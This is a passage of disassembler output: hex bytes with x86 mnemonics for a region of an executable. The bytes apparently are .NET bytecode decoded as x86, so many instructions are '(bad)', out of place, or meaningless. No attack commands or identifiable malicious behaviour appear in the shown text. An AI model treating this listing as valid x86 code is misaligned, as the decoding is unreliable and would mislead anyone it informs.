  402bb7:	fe 0c 05 00 fe 0c 09 	decb   0x90cfe00(,%eax,1)
  402bbe:	00 20                	add    %ah,(%eax)
  402bc0:	02 00                	add    (%eax),%al
  402bc2:	00 00                	add    %al,(%eax)
  402bc4:	59                   	pop    %ecx
  402bc5:	8f 05 00 00 01 e0    	pop    0xe0010000
  402bcb:	4a                   	dec    %edx
  402bcc:	fe 0c 05 00 fe 0c 09 	decb   0x90cfe00(,%eax,1)
  402bd3:	00 20                	add    %ah,(%eax)
  402bd5:	01 00                	add    %eax,(%eax)
  402bd7:	00 00                	add    %al,(%eax)
  402bd9:	59                   	pop    %ecx
  402bda:	8f 05 00 00 01 e0    	pop    0xe0010000
  402be0:	4a                   	dec    %edx
  402be1:	61                   	popa
  402be2:	54                   	push   %esp
  402be3:	fe 0c 0e             	decb   (%esi,%ecx,1)
  402be6:	00 fe                	add    %bh,%dh
  402be8:	0c 09                	or     $0x9,%al
  402bea:	00 20                	add    %ah,(%eax)
  402bec:	02 00                	add    (%eax),%al
  402bee:	00 00                	add    %al,(%eax)
  402bf0:	59                   	pop    %ecx
  402bf1:	20 00                	and    %al,(%eax)
  402bf3:	00 00                	add    %al,(%eax)
  402bf5:	00 9c fe 0c 09 00 20 	add    %bl,0x2000090c(%esi,%edi,8)
  402bfc:	01 00                	add    %eax,(%eax)
  402bfe:	00 00                	add    %al,(%eax)
  402c00:	59                   	pop    %ecx
  402c01:	fe 0e                	decb   (%esi)
  402c03:	09 00                	or     %eax,(%eax)
  402c05:	38 fb                	cmp    %bh,%bl
  402c07:	f4                   	hlt
  402c08:	ff                   	(bad)
  402c09:	ff                   	(bad)
  402c0a:	fe 0c 08             	decb   (%eax,%ecx,1)
  402c0d:	00 fe                	add    %bh,%dh
  402c0f:	0c 09                	or     $0x9,%al
  402c11:	00 20                	add    %ah,(%eax)
  402c13:	03 00                	add    (%eax),%eax
  402c15:	00 00                	add    %al,(%eax)
  402c17:	59                   	pop    %ecx
  402c18:	9a fe 0c 05 00 fe 0c 	lcall  $0xcfe,$0x50cfe
  402c1f:	09 00                	or     %eax,(%eax)
  402c21:	20 02                	and    %al,(%edx)
  402c23:	00 00                	add    %al,(%eax)
  402c25:	00 59 8f             	add    %bl,-0x71(%ecx)
  402c28:	05 00 00 01 e0       	add    $0xe0010000,%eax
  402c2d:	4a                   	dec    %edx
  402c2e:	fe 0c 05 00 fe 0c 09 	decb   0x90cfe00(,%eax,1)
  402c35:	00 20                	add    %ah,(%eax)
  402c37:	01 00                	add    %eax,(%eax)
  402c39:	00 00                	add    %al,(%eax)
  402c3b:	59                   	pop    %ecx
  402c3c:	8f 05 00 00 01 e0    	pop    0xe0010000
  402c42:	4a                   	dec    %edx
  402c43:	9d                   	popf
  402c44:	fe 0c 09             	decb   (%ecx,%ecx,1)
  402c47:	00 20                	add    %ah,(%eax)
  402c49:	03 00                	add    (%eax),%eax
  402c4b:	00 00                	add    %al,(%eax)
  402c4d:	59                   	pop    %ecx
  402c4e:	fe 0e                	decb   (%esi)
  402c50:	09 00                	or     %eax,(%eax)
  402c52:	38 ae f4 ff ff fe    	cmp    %ch,-0x100000c(%esi)
  402c58:	0c 0e                	or     $0xe,%al
  402c5a:	00 fe                	add    %bh,%dh
  402c5c:	0c 09                	or     $0x9,%al
  402c5e:	00 20                	add    %ah,(%eax)
  402c60:	0f 00 00             	sldt   (%eax)
  402c63:	00 9c fe 0c 00 00 fe 	add    %bl,-0x1fffff4(%esi,%edi,8)
  402c6a:	0c 09                	or     $0x9,%al
  402c6c:	00 fe                	add    %bh,%dh
  402c6e:	0c 01                	or     $0x1,%al
  402c70:	00 fe                	add    %bh,%dh
  402c72:	0c 03                	or     $0x3,%al
  402c74:	00 58 4a             	add    %bl,0x4a(%eax)
  402c77:	9e                   	sahf
  402c78:	fe 0c 01             	decb   (%ecx,%eax,1)
  402c7b:	00 20                	add    %ah,(%eax)
  402c7d:	08 00                	or     %al,(%eax)
  402c7f:	00 00                	add    %al,(%eax)
  402c81:	58                   	pop    %eax
  402c82:	fe 0e                	decb   (%esi)
  402c84:	01 00                	add    %eax,(%eax)
  402c86:	fe 0c 09             	decb   (%ecx,%ecx,1)
  402c89:	00 20                	add    %ah,(%eax)
  402c8b:	01 00                	add    %eax,(%eax)
  402c8d:	00 00                	add    %al,(%eax)
  402c8f:	58                   	pop    %eax
  402c90:	fe 0e                	decb   (%esi)
  402c92:	09 00                	or     %eax,(%eax)
  402c94:	38 6c f4 ff          	cmp    %ch,-0x1(%esp,%esi,8)
  402c98:	ff                   	(bad)
  402c99:	fe 0c 05 00 fe 0c 09 	decb   0x90cfe00(,%eax,1)
  402ca0:	00 20                	add    %ah,(%eax)
  402ca2:	01 00                	add    %eax,(%eax)
  402ca4:	00 00                	add    %al,(%eax)
  402ca6:	59                   	pop    %ecx
  402ca7:	8f 05 00 00 01 e0    	pop    0xe0010000
  402cad:	fe 0c 08             	decb   (%eax,%ecx,1)
  402cb0:	00 fe                	add    %bh,%dh
  402cb2:	0c 09                	or     $0x9,%al
  402cb4:	00 20                	add    %ah,(%eax)
  402cb6:	01 00                	add    %eax,(%eax)
  402cb8:	00 00                	add    %al,(%eax)
  402cba:	59                   	pop    %ecx
  402cbb:	9a fe 0c 05 00 fe 0c 	lcall  $0xcfe,$0x50cfe
  402cc2:	09 00                	or     %eax,(%eax)
  402cc4:	20 01                	and    %al,(%ecx)
  402cc6:	00 00                	add    %al,(%eax)
  402cc8:	00 59 8f             	add    %bl,-0x71(%ecx)
  402ccb:	05 00 00 01 e0       	add    $0xe0010000,%eax
  402cd0:	4a                   	dec    %edx
  402cd1:	fe 0c 02             	decb   (%edx,%eax,1)
  402cd4:	00 7e 03             	add    %bh,0x3(%esi)
  402cd7:	00 00                	add    %al,(%eax)
  402cd9:	04 fe                	add    $0xfe,%al
  402cdb:	0c 00                	or     $0x0,%al
  402cdd:	00 fe                	add    %bh,%dh
  402cdf:	0c 09                	or     $0x9,%al
  402ce1:	00 20                	add    %ah,(%eax)
  402ce3:	01 00                	add    %eax,(%eax)
  402ce5:	00 00                	add    %al,(%eax)
  402ce7:	59                   	pop    %ecx
  402ce8:	94                   	xchg   %eax,%esp
  402ce9:	97                   	xchg   %eax,%edi
  402cea:	29 05 00 00 11 d3    	sub    %eax,0xd3110000
  402cf0:	df fe                	(bad)
  402cf2:	0c 0e                	or     $0xe,%al
  402cf4:	00 fe                	add    %bh,%dh
  402cf6:	0c 09                	or     $0x9,%al
  402cf8:	00 20                	add    %ah,(%eax)
  402cfa:	01 00                	add    %eax,(%eax)
  402cfc:	00 00                	add    %al,(%eax)
  402cfe:	59                   	pop    %ecx
  402cff:	20 02                	and    %al,(%edx)
  402d01:	00 00                	add    %al,(%eax)
  402d03:	00 9c 38 fb f3 ff ff 	add    %bl,-0xc05(%eax,%edi,1)
  402d0a:	fe 0c 05 00 fe 0c 09 	decb   0x90cfe00(,%eax,1)
  402d11:	00 20                	add    %ah,(%eax)
  402d13:	02 00                	add    (%eax),%al
  402d15:	00 00                	add    %al,(%eax)
  402d17:	59                   	pop    %ecx
  402d18:	8f 05 00 00 01 e0    	pop    0xe0010000
  402d1e:	fe 0c 05 00 fe 0c 09 	decb   0x90cfe00(,%eax,1)
  402d25:	00 20                	add    %ah,(%eax)
  402d27:	02 00                	add    (%eax),%al
  402d29:	00 00                	add    %al,(%eax)
  402d2b:	59                   	pop    %ecx
  402d2c:	8f 05 00 00 01 e0    	pop    0xe0010000
  402d32:	4d                   	dec    %ebp
  402d33:	fe 0c 05 00 fe 0c 09 	decb   0x90cfe00(,%eax,1)
  402d3a:	00 20                	add    %ah,(%eax)
  402d3c:	01 00                	add    %eax,(%eax)
  402d3e:	00 00                	add    %al,(%eax)
  402d40:	59                   	pop    %ecx
  402d41:	8f 05 00 00 01 e0    	pop    0xe0010000
  402d47:	4a                   	dec    %edx
  402d48:	58                   	pop    %eax
  402d49:	df fe                	(bad)
  402d4b:	0c 0e                	or     $0xe,%al
  402d4d:	00 fe                	add    %bh,%dh
  402d4f:	0c 09                	or     $0x9,%al
  402d51:	00 20                	add    %ah,(%eax)
  402d53:	02 00                	add    (%eax),%al
  402d55:	00 00                	add    %al,(%eax)
  402d57:	59                   	pop    %ecx
  402d58:	20 02                	and    %al,(%edx)
  402d5a:	00 00                	add    %al,(%eax)
  402d5c:	00 9c fe 0c 09 00 20 	add    %bl,0x2000090c(%esi,%edi,8)
  402d63:	01 00                	add    %eax,(%eax)
  402d65:	00 00                	add    %al,(%eax)
  402d67:	59                   	pop    %ecx
  402d68:	fe 0e                	decb   (%esi)
  402d6a:	09 00                	or     %eax,(%eax)
  402d6c:	38 94 f3 ff ff fe 0c 	cmp    %dl,0xcfeffff(%ebx,%esi,8)
  402d73:	05 00 fe 0c 09       	add    $0x90cfe00,%eax
  402d78:	00 20                	add    %ah,(%eax)
  402d7a:	01 00                	add    %eax,(%eax)
  402d7c:	00 00                	add    %al,(%eax)
  402d7e:	59                   	pop    %ecx
  402d7f:	8f 05 00 00 01 e0    	pop    0xe0010000
  402d85:	fe 0c 05 00 fe 0c 09 	decb   0x90cfe00(,%eax,1)
  402d8c:	00 20                	add    %ah,(%eax)
  402d8e:	01 00                	add    %eax,(%eax)
  402d90:	00 00                	add    %al,(%eax)
  402d92:	59                   	pop    %ecx
  402d93:	8f 05 00 00 01 e0    	pop    0xe0010000
  402d99:	4d                   	dec    %ebp
  402d9a:	47                   	inc    %edi
  402d9b:	54                   	push   %esp
  402d9c:	fe 0c 0e             	decb   (%esi,%ecx,1)
  402d9f:	00 fe                	add    %bh,%dh
  402da1:	0c 09                	or     $0x9,%al
  402da3:	00 20                	add    %ah,(%eax)
  402da5:	01 00                	add    %eax,(%eax)
  402da7:	00 00                	add    %al,(%eax)
  402da9:	59                   	pop    %ecx
  402daa:	20 00                	and    %al,(%eax)
  402dac:	00 00                	add    %al,(%eax)
  402dae:	00 9c 38 50 f3 ff ff 	add    %bl,-0xcb0(%eax,%edi,1)
  402db5:	fe 0c 05 00 fe 0c 09 	decb   0x90cfe00(,%eax,1)
  402dbc:	00 20                	add    %ah,(%eax)
  402dbe:	01 00                	add    %eax,(%eax)
  402dc0:	00 00                	add    %al,(%eax)
  402dc2:	59                   	pop    %ecx
  402dc3:	8f 05 00 00 01 e0    	pop    0xe0010000
  402dc9:	fe 0c 05 00 fe 0c 09 	decb   0x90cfe00(,%eax,1)
  402dd0:	00 20                	add    %ah,(%eax)
  402dd2:	01 00                	add    %eax,(%eax)
  402dd4:	00 00                	add    %al,(%eax)
  402dd6:	59                   	pop    %ecx
  402dd7:	8f 05 00 00 01 e0    	pop    0xe0010000
  402ddd:	4a                   	dec    %edx
  402dde:	69 54 fe 0c 0e 00 fe 	imul   $0xcfe000e,0xc(%esi,%edi,8),%edx
  402de5:	0c 
  402de6:	09 00                	or     %eax,(%eax)
  402de8:	20 01                	and    %al,(%ecx)
  402dea:	00 00                	add    %al,(%eax)
  402dec:	00 59 20             	add    %bl,0x20(%ecx)
  402def:	00 00                	add    %al,(%eax)
  402df1:	00 00                	add    %al,(%eax)
  402df3:	9c                   	pushf
  402df4:	38 0c f3             	cmp    %cl,(%ebx,%esi,8)
  402df7:	ff                   	(bad)
  402df8:	ff                   	(bad)
  402df9:	fe 0c 0e             	decb   (%esi,%ecx,1)
  402dfc:	00 fe                	add    %bh,%dh
  402dfe:	0c 09                	or     $0x9,%al
  402e00:	00 20                	add    %ah,(%eax)
  402e02:	01 00                	add    %eax,(%eax)
  402e04:	00 00                	add    %al,(%eax)
  402e06:	59                   	pop    %ecx
  402e07:	20 05 00 00 00 9c    	and    %al,0x9c000000
  402e0d:	fe 0c 08             	decb   (%eax,%ecx,1)
  402e10:	00 fe                	add    %bh,%dh
  402e12:	0c 09                	or     $0x9,%al
  402e14:	00 20                	add    %ah,(%eax)
  402e16:	01 00                	add    %eax,(%eax)
  402e18:	00 00                	add    %al,(%eax)
  402e1a:	59                   	pop    %ecx
  402e1b:	fe 0c 08             	decb   (%eax,%ecx,1)
  402e1e:	00 fe                	add    %bh,%dh
  402e20:	0c 09                	or     $0x9,%al
  402e22:	00 20                	add    %ah,(%eax)
  402e24:	01 00                	add    %eax,(%eax)
  402e26:	00 00                	add    %al,(%eax)
  402e28:	59                   	pop    %ecx
  402e29:	9a 74 02 00 00 1b 7e 	lcall  $0x7e1b,$0x274
  402e30:	03 00                	add    (%eax),%eax
  402e32:	00 04 fe             	add    %al,(%esi,%edi,8)
  402e35:	0c 01                	or     $0x1,%al
  402e37:	00 fe                	add    %bh,%dh
  402e39:	0c 03                	or     $0x3,%al
  402e3b:	00 58 4a             	add    %bl,0x4a(%eax)
  402e3e:	97                   	xchg   %eax,%edi
  402e3f:	29 06                	sub    %eax,(%esi)
  402e41:	00 00                	add    %al,(%eax)
  402e43:	11 a2 fe 0c 01 00    	adc    %esp,0x10cfe(%edx)
  402e49:	20 08                	and    %cl,(%eax)
  402e4b:	00 00                	add    %al,(%eax)
  402e4d:	00 58 fe             	add    %bl,-0x2(%eax)
  402e50:	0e                   	push   %cs
  402e51:	01 00                	add    %eax,(%eax)
  402e53:	38 ad f2 ff ff fe    	cmp    %ch,-0x100000e(%ebp)
  402e59:	0c 08                	or     $0x8,%al
  402e5b:	00 fe                	add    %bh,%dh
  402e5d:	0c 09                	or     $0x9,%al
  402e5f:	00 20                	add    %ah,(%eax)
  402e61:	01 00                	add    %eax,(%eax)
  402e63:	00 00                	add    %al,(%eax)
  402e65:	59                   	pop    %ecx
  402e66:	9a 74 07 00 00 01 7e 	lcall  $0x7e01,$0x774
  402e6d:	03 00                	add    (%eax),%eax
  402e6f:	00 04 fe             	add    %al,(%esi,%edi,8)
  402e72:	0c 01                	or     $0x1,%al
  402e74:	00 fe                	add    %bh,%dh
  402e76:	0c 03                	or     $0x3,%al
  402e78:	00 58 4a             	add    %bl,0x4a(%eax)
  402e7b:	97                   	xchg   %eax,%edi
  402e7c:	29 07                	sub    %eax,(%edi)
  402e7e:	00 00                	add    %al,(%eax)
  402e80:	11 fe                	adc    %edi,%esi
  402e82:	0c 09                	or     $0x9,%al
  402e84:	00 20                	add    %ah,(%eax)
  402e86:	01 00                	add    %eax,(%eax)
  402e88:	00 00                	add    %al,(%eax)
  402e8a:	59                   	pop    %ecx
  402e8b:	fe 0e                	decb   (%esi)
  402e8d:	09 00                	or     %eax,(%eax)
  402e8f:	fe 0c 01             	decb   (%ecx,%eax,1)
  402e92:	00 20                	add    %ah,(%eax)
  402e94:	08 00                	or     %al,(%eax)
  402e96:	00 00                	add    %al,(%eax)
  402e98:	58                   	pop    %eax
  402e99:	fe 0e                	decb   (%esi)
  402e9b:	01 00                	add    %eax,(%eax)
  402e9d:	38 63 f2             	cmp    %ah,-0xe(%ebx)
  402ea0:	ff                   	(bad)
  402ea1:	ff                   	(bad)
  402ea2:	fe 0c 0e             	decb   (%esi,%ecx,1)
  402ea5:	00 fe                	add    %bh,%dh
  402ea7:	0c 09                	or     $0x9,%al
  402ea9:	00 20                	add    %ah,(%eax)
  402eab:	0f 00 00             	sldt   (%eax)
  402eae:	00 9c fe 0c 00 00 fe 	add    %bl,-0x1fffff4(%esi,%edi,8)
  402eb5:	0c 09                	or     $0x9,%al
  402eb7:	00 fe                	add    %bh,%dh
  402eb9:	0c 01                	or     $0x1,%al
  402ebb:	00 fe                	add    %bh,%dh
  402ebd:	0c 03                	or     $0x3,%al
  402ebf:	00 58 4a             	add    %bl,0x4a(%eax)
  402ec2:	9e                   	sahf
  402ec3:	fe 0c 01             	decb   (%ecx,%eax,1)
  402ec6:	00 20                	add    %ah,(%eax)
  402ec8:	08 00                	or     %al,(%eax)
  402eca:	00 00                	add    %al,(%eax)
  402ecc:	58                   	pop    %eax
  402ecd:	fe 0e                	decb   (%esi)
  402ecf:	01 00                	add    %eax,(%eax)
  402ed1:	fe 0c 09             	decb   (%ecx,%ecx,1)
  402ed4:	00 20                	add    %ah,(%eax)
  402ed6:	01 00                	add    %eax,(%eax)
  402ed8:	00 00                	add    %al,(%eax)
  402eda:	58                   	pop    %eax
  402edb:	fe 0e                	decb   (%esi)
  402edd:	09 00                	or     %eax,(%eax)
  402edf:	38 21                	cmp    %ah,(%ecx)
  402ee1:	f2 ff                	repnz (bad)
  402ee3:	ff                   	(bad)
  402ee4:	fe 0c 05 00 fe 0c 09 	decb   0x90cfe00(,%eax,1)
  402eeb:	00 20                	add    %ah,(%eax)
  402eed:	01 00                	add    %eax,(%eax)
  402eef:	00 00                	add    %al,(%eax)
  402ef1:	59                   	pop    %ecx
  402ef2:	8f 05 00 00 01 e0    	pop    0xe0010000
  402ef8:	fe 0c 08             	decb   (%eax,%ecx,1)
  402efb:	00 fe                	add    %bh,%dh
  402efd:	0c 09                	or     $0x9,%al
  402eff:	00 20                	add    %ah,(%eax)
  402f01:	01 00                	add    %eax,(%eax)
  402f03:	00 00                	add    %al,(%eax)
  402f05:	59                   	pop    %ecx
  402f06:	9a fe 0c 05 00 fe 0c 	lcall  $0xcfe,$0x50cfe
  402f0d:	09 00                	or     %eax,(%eax)
  402f0f:	20 01                	and    %al,(%ecx)
  402f11:	00 00                	add    %al,(%eax)
  402f13:	00 59 8f             	add    %bl,-0x71(%ecx)
  402f16:	05 00 00 01 e0       	add    $0xe0010000,%eax
  402f1b:	4a                   	dec    %edx
  402f1c:	fe 0c 02             	decb   (%edx,%eax,1)
  402f1f:	00 7e 03             	add    %bh,0x3(%esi)
  402f22:	00 00                	add    %al,(%eax)
  402f24:	04 fe                	add    $0xfe,%al
  402f26:	0c 00                	or     $0x0,%al
  402f28:	00 fe                	add    %bh,%dh
  402f2a:	0c 09                	or     $0x9,%al
  402f2c:	00 20                	add    %ah,(%eax)
  402f2e:	01 00                	add    %eax,(%eax)
  402f30:	00 00                	add    %al,(%eax)
  402f32:	59                   	pop    %ecx
  402f33:	94                   	xchg   %eax,%esp
  402f34:	97                   	xchg   %eax,%edi
  402f35:	29 08                	sub    %ecx,(%eax)
  402f37:	00 00                	add    %al,(%eax)
  402f39:	11 d3                	adc    %edx,%ebx
  402f3b:	df fe                	(bad)
  402f3d:	0c 0e                	or     $0xe,%al
  402f3f:	00 fe                	add    %bh,%dh
  402f41:	0c 09                	or     $0x9,%al
  402f43:	00 20                	add    %ah,(%eax)
  402f45:	01 00                	add    %eax,(%eax)
  402f47:	00 00                	add    %al,(%eax)
  402f49:	59                   	pop    %ecx
  402f4a:	20 02                	and    %al,(%edx)
  402f4c:	00 00                	add    %al,(%eax)
  402f4e:	00 9c 38 b0 f1 ff ff 	add    %bl,-0xe50(%eax,%edi,1)
  402f55:	fe 0c 0e             	decb   (%esi,%ecx,1)
  402f58:	00 fe                	add    %bh,%dh
  402f5a:	0c 09                	or     $0x9,%al
  402f5c:	00 20                	add    %ah,(%eax)
  402f5e:	01 00                	add    %eax,(%eax)
  402f60:	00 00                	add    %al,(%eax)
  402f62:	59                   	pop    %ecx
  402f63:	20 05 00 00 00 9c    	and    %al,0x9c000000
  402f69:	fe 0c 08             	decb   (%eax,%ecx,1)
  402f6c:	00 fe                	add    %bh,%dh
  402f6e:	0c 09                	or     $0x9,%al
  402f70:	00 20                	add    %ah,(%eax)
  402f72:	01 00                	add    %eax,(%eax)
  402f74:	00 00                	add    %al,(%eax)
  402f76:	59                   	pop    %ecx
  402f77:	fe 0c 08             	decb   (%eax,%ecx,1)
  402f7a:	00 fe                	add    %bh,%dh
  402f7c:	0c 09                	or     $0x9,%al
  402f7e:	00 20                	add    %ah,(%eax)
  402f80:	01 00                	add    %eax,(%eax)
  402f82:	00 00                	add    %al,(%eax)
  402f84:	59                   	pop    %ecx
  402f85:	9a 74 07 00 00 01 7e 	lcall  $0x7e01,$0x774
  402f8c:	03 00                	add    (%eax),%eax
  402f8e:	00 04 fe             	add    %al,(%esi,%edi,8)
  402f91:	0c 01                	or     $0x1,%al
  402f93:	00 fe                	add    %bh,%dh
  402f95:	0c 03                	or     $0x3,%al
  402f97:	00 58 4a             	add    %bl,0x4a(%eax)
  402f9a:	97                   	xchg   %eax,%edi
  402f9b:	29 09                	sub    %ecx,(%ecx)
  402f9d:	00 00                	add    %al,(%eax)
  402f9f:	11 a2 fe 0c 01 00    	adc    %esp,0x10cfe(%edx)
  402fa5:	20 08                	and    %cl,(%eax)
  402fa7:	00 00                	add    %al,(%eax)
  402fa9:	00 58 fe             	add    %bl,-0x2(%eax)
  402fac:	0e                   	push   %cs
  402fad:	01 00                	add    %eax,(%eax)
  402faf:	38 51 f1             	cmp    %dl,-0xf(%ecx)
  402fb2:	ff                   	(bad)
  402fb3:	ff                   	(bad)
  402fb4:	fe 0c 08             	decb   (%eax,%ecx,1)
  402fb7:	00 fe                	add    %bh,%dh
  402fb9:	0c 09                	or     $0x9,%al
  402fbb:	00 20                	add    %ah,(%eax)
  402fbd:	01 00                	add    %eax,(%eax)
  402fbf:	00 00                	add    %al,(%eax)
  402fc1:	59                   	pop    %ecx
  402fc2:	9a 74 08 00 00 01 7a 	lcall  $0x7a01,$0x874
  402fc9:	38 37                	cmp    %dh,(%edi)
  402fcb:	f1                   	int1
  402fcc:	ff                   	(bad)
  402fcd:	ff 00                	incl   (%eax)
  402fcf:	38 31                	cmp    %dh,(%ecx)
  402fd1:	f1                   	int1
  402fd2:	ff                   	(bad)
  402fd3:	ff 20                	jmp    *(%eax)
  402fd5:	01 00                	add    %eax,(%eax)
  402fd7:	00 00                	add    %al,(%eax)
  402fd9:	fe 0e                	decb   (%esi)
  402fdb:	0f 00                	(bad)
  402fdd:	38 23                	cmp    %ah,(%ebx)
  402fdf:	f1                   	int1
  402fe0:	ff                   	(bad)
  402fe1:	ff 00                	incl   (%eax)
  402fe3:	2a 1a                	sub    (%edx),%bl
  402fe5:	28 01                	sub    %al,(%ecx)
  402fe7:	00 00                	add    %al,(%eax)
  402fe9:	0a 2a                	or     (%edx),%ch
  402feb:	3e fe 09             	decb   %ds:(%ecx)
  402fee:	02 00                	add    (%eax),%al
  402ff0:	fe 09                	decb   (%ecx)
  402ff2:	01 00                	add    %eax,(%eax)
  402ff4:	9a 79 01 00 00 01 2a 	lcall  $0x2a01,$0x179
  402ffb:	2a fe                	sub    %dh,%bh
  402ffd:	09 00                	or     %eax,(%eax)
  402fff:	00 28                	add    %ch,(%eax)
  403001:	02 00                	add    (%eax),%al
  403003:	00 0a                	add    %cl,(%edx)
  403005:	2a 1a                	sub    (%edx),%bl
  403007:	7f 05                	jg     0x40300e
  403009:	00 00                	add    %al,(%eax)
  40300b:	04 2a                	add    $0x2a,%al
  40300d:	2a fe                	sub    %dh,%bh
  40300f:	09 00                	or     %eax,(%eax)
  403011:	00 73 03             	add    %dh,0x3(%ebx)
  403014:	00 00                	add    %al,(%eax)
  403016:	0a 2a                	or     (%edx),%ch
  403018:	2a fe                	sub    %dh,%bh
  40301a:	09 00                	or     %eax,(%eax)
  40301c:	00 28                	add    %ch,(%eax)
  40301e:	04 00                	add    $0x0,%al
  403020:	00 0a                	add    %cl,(%edx)
  403022:	2a 1a                	sub    (%edx),%bl
  403024:	7f 06                	jg     0x40302c
  403026:	00 00                	add    %al,(%eax)
  403028:	04 2a                	add    $0x2a,%al
  40302a:	2a fe                	sub    %dh,%bh
  40302c:	09 00                	or     %eax,(%eax)
  40302e:	00 73 05             	add    %dh,0x5(%ebx)
  403031:	00 00                	add    %al,(%eax)
  403033:	0a 2a                	or     (%edx),%ch
  403035:	00 00                	add    %al,(%eax)
  403037:	00 13                	add    %dl,(%ebx)
  403039:	30 03                	xor    %al,(%ebx)
  40303b:	00 98 00 00 00 00    	add    %bl,0x0(%eax)
  403041:	00 00                	add    %al,(%eax)
  403043:	00 20                	add    %ah,(%eax)
  403045:	08 00                	or     %al,(%eax)
  403047:	00 00                	add    %al,(%eax)
  403049:	8d 0a                	lea    (%edx),%ecx
  40304b:	00 00                	add    %al,(%eax)
  40304d:	01 80 03 00 00 04    	add    %eax,0x4000003(%eax)
  403053:	7e 03                	jle    0x403058
  403055:	00 00                	add    %al,(%eax)
  403057:	04 20                	add    $0x20,%al
  403059:	00 00                	add    %al,(%eax)
  40305b:	00 00                	add    %al,(%eax)
  40305d:	fe 06                	incb   (%esi)
  40305f:	02 00                	add    (%eax),%al
  403061:	00 06                	add    %al,(%esi)
  403063:	9b                   	fwait
  403064:	7e 03                	jle    0x403069
  403066:	00 00                	add    %al,(%eax)
  403068:	04 20                	add    $0x20,%al
  40306a:	01 00                	add    %eax,(%eax)
  40306c:	00 00                	add    %al,(%eax)
  40306e:	fe 06                	incb   (%esi)
  403070:	03 00                	add    (%eax),%eax
  403072:	00 06                	add    %al,(%esi)
  403074:	9b                   	fwait
  403075:	7e 03                	jle    0x40307a
  403077:	00 00                	add    %al,(%eax)
  403079:	04 20                	add    $0x20,%al
  40307b:	02 00                	add    (%eax),%al
  40307d:	00 00                	add    %al,(%eax)
  40307f:	fe 06                	incb   (%esi)
  403081:	04 00                	add    $0x0,%al
  403083:	00 06                	add    %al,(%esi)
  403085:	9b                   	fwait
  403086:	7e 03                	jle    0x40308b
  403088:	00 00                	add    %al,(%eax)
  40308a:	04 20                	add    $0x20,%al
  40308c:	03 00                	add    (%eax),%eax
  40308e:	00 00                	add    %al,(%eax)
  403090:	fe 06                	incb   (%esi)
  403092:	05 00 00 06 9b       	add    $0x9b060000,%eax
  403097:	7e 03                	jle    0x40309c
  403099:	00 00                	add    %al,(%eax)
  40309b:	04 20                	add    $0x20,%al
  40309d:	04 00                	add    $0x0,%al
  40309f:	00 00                	add    %al,(%eax)
  4030a1:	fe 06                	incb   (%esi)
  4030a3:	06                   	push   %es
  4030a4:	00 00                	add    %al,(%eax)
  4030a6:	06                   	push   %es
  4030a7:	9b                   	fwait
  4030a8:	7e 03                	jle    0x4030ad
  4030aa:	00 00                	add    %al,(%eax)
  4030ac:	04 20                	add    $0x20,%al
  4030ae:	05 00 00 00 fe       	add    $0xfe000000,%eax
  4030b3:	06                   	push   %es
  4030b4:	07                   	pop    %es
  4030b5:	00 00                	add    %al,(%eax)
  4030b7:	06                   	push   %es
  4030b8:	9b                   	fwait
  4030b9:	7e 03                	jle    0x4030be
  4030bb:	00 00                	add    %al,(%eax)
  4030bd:	04 20                	add    $0x20,%al
  4030bf:	06                   	push   %es
  4030c0:	00 00                	add    %al,(%eax)
  4030c2:	00 fe                	add    %bh,%dh
  4030c4:	06                   	push   %es
  4030c5:	08 00                	or     %al,(%eax)
  4030c7:	00 06                	add    %al,(%esi)
  4030c9:	9b                   	fwait
  4030ca:	7e 03                	jle    0x4030cf
  4030cc:	00 00                	add    %al,(%eax)
  4030ce:	04 20                	add    $0x20,%al
  4030d0:	07                   	pop    %es
  4030d1:	00 00                	add    %al,(%eax)
  4030d3:	00 fe                	add    %bh,%dh
  4030d5:	06                   	push   %es
  4030d6:	09 00                	or     %eax,(%eax)
  4030d8:	00 06                	add    %al,(%esi)
  4030da:	9b                   	fwait
  4030db:	2a 13                	sub    (%ebx),%dl
  4030dd:	30 02                	xor    %al,(%edx)
  4030df:	00 5a 00             	add    %bl,0x0(%edx)
  4030e2:	00 00                	add    %al,(%eax)
  4030e4:	0a 00                	or     (%eax),%al
  4030e6:	00 11                	add    %dl,(%ecx)
  4030e8:	fe 09                	decb   (%ecx)
  4030ea:	0b 00                	or     (%eax),%eax
  4030ec:	28 06                	sub    %al,(%esi)
  4030ee:	00 00                	add    %al,(%eax)
  4030f0:	0a 20                	or     (%eax),%ah
  4030f2:	00 00                	add    %al,(%eax)
  4030f4:	00 00                	add    %al,(%eax)
  4030f6:	fe 01                	incb   (%ecx)
  4030f8:	fe 0e                	decb   (%esi)
  4030fa:	00 00                	add    %al,(%eax)
  4030fc:	fe 09                	decb   (%ecx)
  4030fe:	06                   	push   %es
  4030ff:	00 fe                	add    %bh,%dh
  403101:	0c 00                	or     $0x0,%al
  403103:	00 81 0c 00 00 01    	add    %al,0x100000c(%ecx)
  403109:	fe 09                	decb   (%ecx)
  40310b:	06                   	push   %es
  40310c:	00 71 0c             	add    %dh,0xc(%ecx)
  40310f:	00 00                	add    %al,(%eax)
  403111:	01 39                	add    %edi,(%ecx)
  403113:	0a 00                	or     (%eax),%al
  403115:	00 00                	add    %al,(%eax)
  403117:	20 00                	and    %al,(%eax)
  403119:	00 00                	add    %al,(%eax)
  40311b:	00 38                	add    %bh,(%eax)
  40311d:	06                   	push   %es
  40311e:	00 00                	add    %al,(%eax)
  403120:	00 00                	add    %al,(%eax)
  403122:	20 01                	and    %al,(%ecx)
  403124:	00 00                	add    %al,(%eax)
  403126:	00 00                	add    %al,(%eax)
  403128:	20 01                	and    %al,(%ecx)
  40312a:	00 00                	add    %al,(%eax)
  40312c:	00 5a 20             	add    %bl,0x20(%edx)
  40312f:	08 00                	or     %al,(%eax)
  403131:	00 00                	add    %al,(%eax)
  403133:	58                   	pop    %eax
  403134:	fe 0e                	decb   (%esi)
  403136:	01 00                	add    %eax,(%eax)
  403138:	fe 09                	decb   (%ecx)
  40313a:	00 00                	add    %al,(%eax)
  40313c:	fe 0c 01             	decb   (%ecx,%eax,1)
  40313f:	00 54 2a 00          	add    %dl,0x0(%edx,%ebp,1)
  403143:	00 13                	add    %dl,(%ebx)
  403145:	30 02                	xor    %al,(%edx)
  403147:	00 1c 00             	add    %bl,(%eax,%eax,1)
  40314a:	00 00                	add    %al,(%eax)
  40314c:	00 00                	add    %al,(%eax)
  40314e:	00 00                	add    %al,(%eax)
  403150:	fe 09                	decb   (%ecx)
  403152:	03 00                	add    (%eax),%eax
  403154:	26 00 00             	add    %al,%es:(%eax)
  403157:	fe 09                	decb   (%ecx)
  403159:	01 00                	add    %eax,(%eax)
  40315b:	20 12                	and    %dl,(%edx)
